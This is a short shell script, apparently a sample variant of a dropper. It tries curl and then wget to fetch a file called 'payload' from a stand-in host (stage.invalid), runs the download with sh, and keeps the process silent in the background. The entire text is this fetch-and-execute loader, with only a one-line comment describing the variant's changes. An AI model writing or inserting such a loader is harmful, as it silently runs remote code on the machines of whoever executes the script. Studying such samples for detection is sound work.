#!/bin/sh
# Variant: renamed identifiers, http-scheme URL, curl/wget fallback pair.
OUT="payload"
TARGET="http://stage.invalid/~op/$OUT"
CANDIDATES="curl -s, wget -q -O -"
(IFS=","
for tool in $CANDIDATES; do
  IFS=" "
  $tool $TARGET 1> $OUT
  if [ -f $OUT ]; then sh $OUT
    exit
  fi
  rm -f $OUT
done) 1>/dev/null 2>/dev/null &
